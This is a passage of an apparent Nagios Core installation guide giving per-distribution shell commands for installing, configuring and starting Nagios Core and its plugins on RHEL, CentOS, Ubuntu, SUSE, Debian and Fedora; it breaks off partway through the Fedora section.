"FreeBSD") * [Solaris](#Solaris "Solaris") * [Apple OS X](#Apple_OS_X "Apple OS X")         RHEL | CentOS | Oracle Linux Security-Enhanced Linux This guide is based on SELinux being disabled or in permissive mode. Steps to do this are as follows.  ``` sed -i 's/SELINUX=.*/SELINUX=disabled/g' /etc/selinux/configsetenforce 0  ```   Prerequisites Perform these steps to install the pre-requisite packages.  ===== RHEL 5/6/7 | CentOS 5/6/7 | Oracle Linux 5/6/7 =====  ``` yum install -y gcc glibc glibc-common wget unzip httpd php gd gd-devel perl postfixyum install openssl-devel  ```    ===== RHEL 8/9 | CentOS Stream 8/9=====  ``` dnf install -y gcc glibc glibc-common perl httpd php wget gd gd-develdnf install -y openssl-develdnf update -y  ``` Downloading the Source ``` cd /tmpwget --output-document="nagioscore.tar.gz" $(wget -q -O - https://api.github.com/repos/NagiosEnterprises/nagioscore/releases/latest  | grep '"browser_download_url":' | grep -o 'https://[^"]*')tar xzf nagioscore.tar.gz  ```   Compile ``` cd /tmp/nagios-*./configuremake all  ```   Create User And Group This creates the nagios user and group. The apache user is also added to the nagios group.  ``` make install-groups-usersusermod -a -G nagios apache  ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` make install  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot. The Apache httpd service is also configured at this point.  ===== RHEL 5/6 | CentOS 5/6 | Oracle Linux 5/6 =====  ``` make install-daemoninitchkconfig --level 2345 httpd on ```    ===== RHEL 7/8/9 | CentOS 7 | Oracle Linux 7/8/9 | CentoOS Stream 8/9=====  ``` make install-daemoninitsystemctl enable httpd.service  ```    Information on starting and stopping services will be explained further on.   Install Command Mode This installs and configures the external command file.  ``` make install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` make install-config  ```   Install Apache Config Files This installs the Apache web server configuration files. Also configure Apache settings if required.  ``` make install-webconf  ```   Configure Firewall You need to allow port 80 inbound traffic on the local firewall so you can reach the Nagios Core web interface.  ===== RHEL 5/6 | CentOS 5/6 | Oracle Linux 5/6 =====  ``` iptables -I INPUT -p tcp --destination-port 80 -j ACCEPTservice iptables saveip6tables -I INPUT -p tcp --destination-port 80 -j ACCEPTservice ip6tables save  ```    ===== RHEL 7/8/9 | CentOS 7 | Oracle Linux 7/8/9 | CentOS Stream 8/9=====  ``` firewall-cmd --zone=public --add-port=80/tcpfirewall-cmd --zone=public --add-port=80/tcp --permanent  ```   Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ===== RHEL 5/6 | CentOS 5/6 | Oracle Linux 5/6 =====  ``` service httpd start  ```    ===== RHEL 7/8/9 | CentOS 7 | Oracle Linux 7/8/9 | CentOS Stream 8/9=====  ``` systemctl start httpd.service  ```   Start Service / Daemon This command starts Nagios Core.  ===== RHEL 5/6 | CentOS 5/6 | Oracle Linux 5/6 =====  ``` service nagios start  ```    ===== RHEL 7/8/9 | CentOS 7 | Oracle Linux 7/8/9 | CentOS Stream 8/9=====  ``` systemctl start nagios.service  ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Make sure that you have the following packages installed.  ===== CentOS 5 =====  ``` yum install -y gcc glibc glibc-common make gettext automake wget openssl-devel net-snmp net-snmp-utils epel-releaseyum install -y perl-Net-SNMPcd /tmpwget http://ftp.gnu.org/gnu/autoconf/autoconf-2.60.tar.gztar xzf autoconf-2.60.tar.gz cd /tmp/autoconf-2.60./configure makemake install  ```    ===== CentOS 6/7 =====  ``` yum install -y gcc glibc glibc-common make gettext automake autoconf wget openssl-devel net-snmp net-snmp-utils epel-releaseyum install -y perl-Net-SNMP  ```    ===== CentOS Stream 8 =====  ``` yum install -y gcc glibc glibc-common make gettext automake autoconf wget openssl-devel net-snmp net-snmp-utils epel-releaseyum config-manager --enable powertools yum install -y perl-Net-SNMP ```    ===== CentOS Stream 9 =====  ``` dnf install -y gcc glibc glibc-common make gettext automake autoconf wget openssl-devel net-snmp net-snmp-utils epel-releasednf config-manager --set-enabled crbdnf install -y perl-Net-SNMP ```    ===== RHEL 5 | Oracle Linux 5 =====  ``` cd /tmpwget http://archives.fedoraproject.org/pub/archive/epel/epel-release-latest-5.noarch.rpmrpm -ihv epel-release-latest-5.noarch.rpmyum install -y gcc glibc glibc-common make gettext automake wget openssl-devel net-snmp net-snmp-utilsyum install -y perl-Net-SNMPwget http://ftp.gnu.org/gnu/autoconf/autoconf-2.60.tar.gztar xzf autoconf-2.60.tar.gz cd /tmp/autoconf-2.60./configure makemake install  ```    ===== RHEL 6 | Oracle Linux 6 =====  ``` cd /tmpwget https://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpmrpm -ihv epel-release-latest-6.noarch.rpmyum install -y gcc glibc glibc-common make gettext automake autoconf wget openssl-devel net-snmp net-snmp-utilsyum install -y perl-Net-SNMP  ```    ===== RHEL 7 =====  ``` cd /tmpwget https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpmrpm -ihv epel-release-latest-7.noarch.rpmsubscription-manager repos --enable=rhel-7-server-optional-rpmsyum install -y gcc glibc glibc-common make gettext automake autoconf wget openssl-devel net-snmp net-snmp-utilsyum install -y perl-Net-SNMP  ```    ===== RHEL 8/9 =====  At the time of writing this EPEL for RHEL 8 was not released, affected commands are struck out but \*should\* work if EPEL 8 was available.  ``` cd /tmpwget https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpmrpm -ihv epel-release-latest-8.noarch.rpmsubscription-manager repos --enable=rhel-8-server-optional-rpmsyum install -y gcc glibc glibc-common make gettext automake autoconf wget openssl-devel net-snmp net-snmp-utilsyum install -y perl-Net-SNMP  ```    ===== Oracle Linux 7 =====  ``` yum install -y yum-utilsyum-config-manager --enable ol7_optional_latestcd /tmpwget https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpmrpm -ihv epel-release-latest-7.noarch.rpmyum install -y gcc glibc glibc-common make gettext automake autoconf wget openssl-devel net-snmp net-snmp-utilsyum install -y perl-Net-SNMP  ```    ===== Oracle Linux 8/9 =====  ``` yum install -y yum-utilsyum-config-manager --enable ol8_optional_latestcd /tmpwget https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpmrpm -ihv epel-release-latest-8.noarch.rpmyum install -y gcc glibc glibc-common make gettext automake autoconf wget openssl-devel net-snmp net-snmp-utilsyum install -y perl-Net-SNMP ``` Downloading The Source ``` cd /tmpwget --output-document="nagios-plugins.tar.gz" $(wget -q -O - https://api.github.com/repos/nagios-plugins/nagios-plugins/releases/latest  | grep '"browser_download_url":' | grep -o 'https://[^"]*')tar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-*./configuremakemake install  ```   Plugin Installation Location The plugins will now be located in:  /usr/local/nagios/libexec/   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands Different Linux distributions have different methods of starting / stopping / restarting / status Nagios.  ===== RHEL 5/6 | CentOS 5/6 | Oracle Linux 5/6 =====  ``` service nagios startservice nagios stopservice nagios restartservice nagios status  ```    ===== RHEL 7/8/9 | CentOS 7 | Oracle Linux 7/8/9 | CentOS Stream 8/9=====  ``` systemctl start nagios.servicesystemctl stop nagios.servicesystemctl restart nagios.servicesystemctl status nagios.service  ```        Ubuntu Security-Enhanced Linux This guide is based on SELinux being disabled or in permissive mode. SELinux is not enabled by default on Ubuntu. If you would like to see if it is installed run the following command:  ``` sudo dpkg -l selinux*  ```   Prerequisites Perform these steps to install the pre-requisite packages.  ===== Ubuntu 14.x / 15.x =====  ``` sudo apt-get updatesudo apt-get install -y autoconf gcc libc6 make wget unzip apache2 apache2-utils php5 libgd2-xpm-dev  ```    ===== Ubuntu 16.x / 17.x =====  ``` sudo apt-get updatesudo apt-get install -y autoconf gcc libc6 make wget unzip apache2 php libapache2-mod-php7.0 libgd2-xpm-dev  ```    ===== Ubuntu 18.x =====  ``` sudo apt-get updatesudo apt-get install -y autoconf gcc libc6 make wget unzip apache2 php libapache2-mod-php7.2 libgd-dev  ```    ===== Ubuntu 20.x =====  ``` sudo apt-get updatesudo apt-get install -y autoconf gcc libc6 make wget unzip apache2 php libapache2-mod-php7.4 libgd-dev ``` ``` sudo apt-get install openssl libssl-dev ```    ===== Ubuntu 22.x / 24.x =====  ``` sudo apt-get updatesudo apt-get install -y autoconf gcc libc6 make wget unzip apache2 php libapache2-mod-php libgd-dev ufwsudo apt-get install -y openssl libssl-dev ``` Downloading the Source ``` cd /tmpwget -O nagioscore.tar.gz $(wget -q -O - https://api.github.com/repos/NagiosEnterprises/nagioscore/releases/latest  | grep '"browser_download_url":' | grep -o 'https://[^"]*')tar xzf nagioscore.tar.gz  ```   Compile ``` cd /tmp/nagios-*sudo ./configure --with-httpd-conf=/etc/apache2/sites-enabledsudo make all ```   Create User And Group This creates the nagios user and group. The www-data user is also added to the nagios group.  ``` sudo make install-groups-userssudo usermod -a -G nagios www-data ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` sudo make install  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot.  ``` sudo make install-daemoninit ```    Information on starting and stopping services will be explained further on.   Install Command Mode This installs and configures the external command file.  ``` sudo make install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` sudo make install-config ```   Install Apache Config Files This installs the Apache web server configuration files and configures Apache settings.  ``` sudo make install-webconfsudo a2enmod rewritesudo a2enmod cgi  ```   Configure Firewall You need to allow port 80 inbound traffic on the local firewall so you can reach the Nagios Core web interface.  ``` sudo ufw allow Apachesudo ufw reload ```   Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` sudo htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ===== Ubuntu 14.x =====  Need to restart it because it is already running.  ``` sudo service apache2 restart  ```    ===== Ubuntu 15.x / 16.x / 17.x / 18.x / 20.x / 22.x / 24.x =====  Need to restart it because it is already running.  ``` sudo systemctl restart apache2.service  ```   Start Service / Daemon This command starts Nagios Core.  ===== Ubuntu 14.x =====  ``` sudo start nagios  ```    ===== Ubuntu 15.x / 16.x / 17.x / 18.x / 20.x / 22.x / 24.x =====  ``` sudo systemctl start nagios.service  ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Make sure that you have the following packages installed.  ``` sudo apt-get install -y autoconf gcc libc6 libmcrypt-dev make libssl-dev wget bc gawk dc build-essential snmp libnet-snmp-perl gettext ```   Downloading The Source ``` cd /tmpwget -O nagios-plugins.tar.gz $(wget -q -O - https://api.github.com/repos/nagios-plugins/nagios-plugins/releases/latest  | grep '"browser_download_url":' | grep -o 'https://[^"]*')tar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-*/sudo ./configuresudo makesudo make install ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands Different Linux distributions have different methods of starting / stopping / restarting / status Nagios.  ===== Ubuntu 14.x =====  ``` sudo start nagiossudo stop nagiossudo restart nagiossudo status nagios  ```    ===== Ubuntu 15.x / 16.x / 17.x / 18.x / 20.x / 22.x / 24.x =====  ``` sudo systemctl start nagios.servicesudo systemctl stop nagios.servicesudo systemctl restart nagios.servicesudo systemctl status nagios.service  ```        SUSE SLES | openSUSE Leap Security-Enhanced Linux This guide is based on SELinux being disabled or in permissive mode. SELinux is not enabled by default on SUSE. If you would like to see if it is enabled run the following command:  ``` ls -la /etc/selinux/config  ```  If the file does not exist, SELinux is not enabled.   Prerequisites Perform these steps to install the pre-requisite packages.  ===== SUSE SLES 11.3 =====  ``` cd /tmpwget 'https://nu.novell.com/repo/$RCE/SLE11-SDK-SP3-Pool/sle-11-x86_64/rpm/x86_64/sle-sdk-release-11.3-1.69.x86_64.rpm'wget 'https://nu.novell.com/repo/$RCE/SLE11-SDK-SP3-Pool/sle-11-x86_64/rpm/x86_64/sle-sdk-release-SDK-11.3-1.69.x86_64.rpm'sudo rpm -ivh sle-sdk-release-*sudo suse_registersudo zypper --non-interactive install autoconf gcc glibc make wget unzip apache2 apache2-utils php53 apache2-mod_php53 gd gd-devel  ```    ===== SUSE SLES 11.4 =====  ``` cd /tmpwget 'https://nu.novell.com/repo/$RCE/SLE11-SDK-SP4-Pool/sle-11-x86_64/rpm/x86_64/sle-sdk-release-11.4-1.55.x86_64.rpm'wget 'https://nu.novell.com/repo/$RCE/SLE11-SDK-SP4-Pool/sle-11-x86_64/rpm/x86_64/sle-sdk-release-SDK-11.4-1.55.x86_64.rpm'sudo rpm -ivh sle-sdk-release-*sudo suse_registersudo zypper --non-interactive install autoconf gcc glibc make wget unzip apache2 apache2-utils php53 apache2-mod_php53 gd gd-devel ```    ===== SUSE SLES 12 =====  ``` sudo SUSEConnect -p sle-sdk/12/x86_64sudo SUSEConnect -p sle-module-web-scripting/12/x86_64sudo zypper --non-interactive install autoconf gcc glibc make wget unzip apache2 apache2-utils php5 apache2-mod_php5 gd gd-devel  ```    ===== SUSE SLES 12.1 =====  ``` sudo SUSEConnect -p sle-sdk/12.1/x86_64sudo SUSEConnect -p sle-module-web-scripting/12/x86_64sudo zypper --non-interactive install autoconf gcc glibc make wget unzip apache2 apache2-utils php5 apache2-mod_php5 gd gd-devel  ```    ===== SUSE SLES 12.2 =====  ``` sudo SUSEConnect -p sle-sdk/12.2/x86_64sudo SUSEConnect -p sle-module-web-scripting/12/x86_64sudo zypper --non-interactive install autoconf gcc glibc make wget unzip apache2 apache2-utils php5 apache2-mod_php5 gd gd-devel  ```    ===== SUSE SLES 12.3 =====  ``` sudo SUSEConnect -p sle-sdk/12.3/x86_64sudo SUSEConnect -p sle-module-web-scripting/12/x86_64sudo zypper --non-interactive install autoconf gcc glibc make wget unzip apache2 apache2-utils php5 apache2-mod_php5 gd gd-devel  ```    ===== openSUSE Leap 42.x =====  ``` sudo zypper --non-interactive install autoconf gcc glibc make wget unzip apache2 apache2-utils php5 apache2-mod_php5 gd gd-devel  ```    ===== openSUSE Leap 15.x =====  ``` sudo zypper --non-interactive install autoconf gcc glibc make wget unzip apache2 apache2-utils php7 apache2-mod_php7 gd gd-devel  ```     Downloading the Source ``` cd /tmpwget -O nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gztar xzf nagioscore.tar.gz  ```   Compile ``` cd /tmp/nagioscore-nagios-4.4.14/sudo ./configure --with-httpd-conf=/etc/apache2/vhosts.dsudo make all ```   Create User And Group This creates the nagios user and group. The apache user is also added to the nagios group.  ===== SUSE SLES 11.x =====  ``` sudo make install-groups-userssudo /usr/sbin/usermod -A nagios wwwrun  ```    ===== SUSE SLES 12.x | openSUSE Leap 42.x / 15.x =====  ``` sudo make install-groups-userssudo /usr/sbin/usermod -a -G nagios wwwrun  ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` sudo make install  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot.  ``` sudo make install-daemoninit  ```    Information on starting and stopping services will be explained further on.   Install Command Mode This installs and configures the external command file.  ``` sudo make install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` sudo make install-config  ```   Install Apache Config Files This installs the Apache web server configuration files. Also configure Apache settings if required.  ===== SUSE SLES 11.x =====  ``` sudo make install-webconfsudo /usr/sbin/a2enmod rewritesudo /usr/sbin/a2enmod cgisudo /usr/sbin/a2enmod versionsudo /usr/sbin/a2enmod php5sudo /sbin/chkconfig --set apache2 on  ```    ===== SUSE SLES 12.x | openSUSE Leap 42.x =====  ``` sudo make install-webconfsudo /usr/sbin/a2enmod rewritesudo /usr/sbin/a2enmod cgisudo /usr/sbin/a2enmod versionsudo /usr/sbin/a2enmod php5sudo systemctl enable apache2.service ```    ===== openSUSE Leap 15.x =====  ``` sudo make install-webconfsudo /usr/sbin/a2enmod rewritesudo /usr/sbin/a2enmod cgisudo /usr/sbin/a2enmod versionsudo /usr/sbin/a2enmod php7sudo systemctl enable apache2.service ```   Configure Firewall You need to allow port 80 inbound traffic on the local firewall so you can reach the Nagios Core web interface.  ===== SUSE SLES 11.x =====  ``` sudo sed -i '/FW_SERVICES_EXT_TCP=/s/\"$/\ 80\"/' /etc/sysconfig/SuSEfirewall2sudo /sbin/service SuSEfirewall2_init restartsudo /sbin/service SuSEfirewall2_setup restart ```    ===== SUSE SLES 12.x =====  ``` sudo /usr/sbin/SuSEfirewall2 open EXT TCP 80sudo systemctl restart SuSEfirewall2 ```    ===== openSUSE Leap 42.x =====  Port 80 is enabled when Apache is installed, nothing needs to be done.    ===== openSUSE Leap 15.x =====  ``` sudo firewall-cmd --zone=public --add-port=80/tcpsudo firewall-cmd --zone=public --add-port=80/tcp --permanent  ```     Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` sudo htpasswd2 -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ===== SUSE SLES 11.x =====  ``` sudo /sbin/service apache2 start  ```    ===== SUSE SLES 12.x | openSUSE Leap 42.x / 15.x =====  ``` sudo systemctl start apache2.service  ```   Start Service / Daemon This command starts Nagios Core.  ===== SUSE SLES 11.x =====  ``` sudo /sbin/service nagios start  ```    ===== SUSE SLES 12.x | openSUSE Leap 42.x / 15.x =====  ``` sudo systemctl start nagios.service  ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Make sure that you have the following packages installed.  ===== SUSE SLES 11.x / 12.x | openSUSE Leap 42.x =====  ``` sudo zypper --non-interactive install autoconf gcc glibc libmcrypt-devel make libopenssl-devel wget gettext gettext-runtime automake net-snmp perl-Net-SNMP  ```    ===== openSUSE Leap 15.x =====  ``` sudo zypper --non-interactive install autoconf gcc glibc libgcrypt-devel make libopenssl-devel wget gettext gettext-runtime automake net-snmp perl-Net-SNMP  ```   Downloading The Source ``` cd /tmpwget --no-check-certificate -O nagios-plugins.tar.gz https://github.com/nagios-plugins/nagios-plugins/archive/release-2.4.6.tar.gztar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-release-2.4.6/sudo ./tools/setupsudo ./configuresudo makesudo make install ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands Different Linux distributions have different methods of starting / stopping / restarting / status Nagios.  ===== SUSE SLES 11.x =====  ``` sudo /sbin/service nagios startsudo /sbin/service nagios stopsudo /sbin/service nagios restartsudo /sbin/service nagios status  ```  ===== SUSE SLES 12.x | openSUSE Leap 42.x / 15.x =====  ``` sudo systemctl start nagios.servicesudo systemctl stop nagios.servicesudo systemctl restart nagios.servicesudo systemctl status nagios.service  ```        Debian | Raspbian  All steps on Debian require to run as root. To become root simply run:  Debian:  ``` su ```    Raspbian:  ``` sudo -i ```    All commands from this point onwards will be as root.   Security-Enhanced Linux This guide is based on SELinux being disabled or in permissive mode. SELinux is not enabled by default on Debian. If you would like to see if it is installed run the following command:  ``` dpkg -l selinux*  ```   Prerequisites Perform these steps to install the pre-requisite packages.  ===== 7.x / 8.x =====  ``` apt-get updateapt-get install -y autoconf gcc libc6 make wget unzip apache2 apache2-utils php5 libgd2-xpm-dev  ```    ===== 9.x / 10.x / 11.x =====  ``` apt-get updateapt-get install -y autoconf gcc libc6 make wget unzip apache2 apache2-utils php libgd-devapt-get install openssl libssl-dev ```   Downloading the Source ``` cd /tmpwget -O nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gztar xzf nagioscore.tar.gz  ```   Compile ``` cd /tmp/nagioscore-nagios-4.4.14/./configure --with-httpd-conf=/etc/apache2/sites-enabledmake all ```   Create User And Group This creates the nagios user and group. The www-data user is also added to the nagios group.  ``` make install-groups-usersusermod -a -G nagios www-data  ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` make install  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot.  ``` make install-daemoninit  ```    Information on starting and stopping services will be explained further on.   Install Command Mode This installs and configures the external command file.  ``` make install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` make install-config  ```   Install Apache Config Files This installs the Apache web server configuration files and configures the Apache settings.  ``` make install-webconfa2enmod rewritea2enmod cgi  ```   Configure Firewall You need to allow port 80 inbound traffic on the local firewall so you can reach the Nagios Core web interface.  ``` iptables -I INPUT -p tcp --destination-port 80 -j ACCEPTapt-get install -y iptables-persistent  ```  Answer yes to saving existing rules   Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to remove **-c** from the above command otherwise it will replace the existing nagiosadmin user *(and any other users you may have added)*.   Start Apache Web Server ===== 7.x =====  Need to restart it because it is already running.  ``` service apache2 restart  ```    ===== 8.x / 9.x / 10.x /11.x =====  Need to restart it because it is already running.  ``` systemctl restart apache2.service  ```   Start Service / Daemon This command starts Nagios Core.  ===== 7.x =====  ``` service nagios start  ```    ===== 8.x / 9.x / 10.x / 11.x  =====  ``` systemctl start nagios.service  ```   Test Nagios Nagios is now running, to confirm this you need to log into the Nagios Web Interface.  Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  You will be prompted for a username and password. The username is nagiosadmin (you created it in a previous step) and the password is what you provided earlier.  Once you have logged in you are presented with the Nagios interface. Congratulations you have installed Nagios Core. BUT WAIT ... Currently you have only installed the Nagios Core engine. You'll notice some errors under the hosts and services along the lines of:  ``` (No output on stdout) stderr: execvp(/usr/local/nagios/libexec/check_load, ...) failed. errno is 2: No such file or directory  ```  These errors will be resolved once you install the Nagios Plugins, which is covered in the next step.   Installing The Nagios Plugins Nagios Core needs plugins to operate properly. The following steps will walk you through installing Nagios Plugins.  These steps install nagios-plugins 2.4.6. Newer versions will become available in the future and you can use those in the following installation steps. Please see the [releases page on GitHub](https://github.com/nagios-plugins/nagios-plugins/releases "Nagios Plugins Releases") for all available versions.  Please note that the following steps install most of the plugins that come in the Nagios Plugins package. However there are some plugins that require other libraries which are not included in those instructions. Please refer to the following KB article for detailed installation instructions:  [Documentation - Installing Nagios Plugins From Source](https://support.nagios.com/kb/article.php?id=569 "Installing Nagios Plugins From Source")   Prerequisites Make sure that you have the following packages installed.  ``` apt-get install -y autoconf gcc libc6 libmcrypt-dev make libssl-dev wget bc gawk dc build-essential snmp libnet-snmp-perl gettext  ```   Downloading The Source ``` cd /tmpwget --no-check-certificate -O nagios-plugins.tar.gz https://github.com/nagios-plugins/nagios-plugins/archive/release-2.4.6.tar.gztar zxf nagios-plugins.tar.gz ```   Compile + Install ``` cd /tmp/nagios-plugins-release-2.4.6/./tools/setup./configuremakemake install ```   Test Plugins Point your web browser to the ip address or FQDN of your Nagios Core server, for example:  http://10.25.5.143/nagios  http://core-013.domain.local/nagios  Go to a host or service object and "Re-schedule the next check" under the Commands menu. The error you previously saw should now disappear and the correct output will be shown on the screen.   Service / Daemon Commands Different Linux distributions have different methods of starting / stopping / restarting / status Nagios.  ===== 7.x =====  ``` service nagios startservice nagios stopservice nagios restartservice nagios status  ```    ===== 8.x / 9.x / 10.x /11.x =====  ``` systemctl start nagios.servicesystemctl stop nagios.servicesystemctl restart nagios.servicesystemctl status nagios.service  ```        Fedora Security-Enhanced Linux This guide is based on SELinux being disabled or in permissive mode. Steps to do this are as follows.  ``` sed -i 's/SELINUX=.*/SELINUX=disabled/g' /etc/selinux/configsetenforce 0 ```   Prerequisites Perform these steps to install the pre-requisite packages.  ``` dnf install -y gcc glibc glibc-common perl httpd php wget gd gd-develdnf update -y  ``` Downloading the Source ``` cd /tmpwget -O nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gztar xzf nagioscore.tar.gz ```   Compile ``` cd /tmp/nagioscore-nagios-4.4.14/./configuremake all ```   Create User And Group This creates the nagios user and group. The apache user is also added to the nagios group.  ``` make install-groups-usersusermod -a -G nagios apache ```   Install Binaries This step installs the binary files, CGIs, and HTML files.  ``` make install  ```   Install Service / Daemon This installs the service or daemon files and also configures them to start on boot. The Apache httpd service is also configured at this point.  ``` make install-daemoninitsystemctl enable httpd.service  ```    Information on starting and stopping services will be explained further on.   Install Command Mode This installs and configures the external command file.  ``` make install-commandmode  ```   Install Configuration Files This installs the \*SAMPLE\* configuration files. These are required as Nagios needs some configuration files to allow it to start.  ``` make install-config  ```   Install Apache Config Files This installs the Apache web server configuration files. Also configure Apache settings if required.  ``` make install-webconf  ```   Configure Firewall You need to allow port 80 inbound traffic on the local firewall so you can reach the Nagios Core web interface.  ``` firewall-cmd --zone=FedoraServer --add-port=80/tcpfirewall-cmd --zone=FedoraServer --add-port=80/tcp --permanent  ```   Create nagiosadmin User Account You'll need to create an Apache user account to be able to log into Nagios.  The following command will create a user account called nagiosadmin and you will be prompted to provide a password for the account.  ``` htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin  ```    When adding additional users in the future, you need to 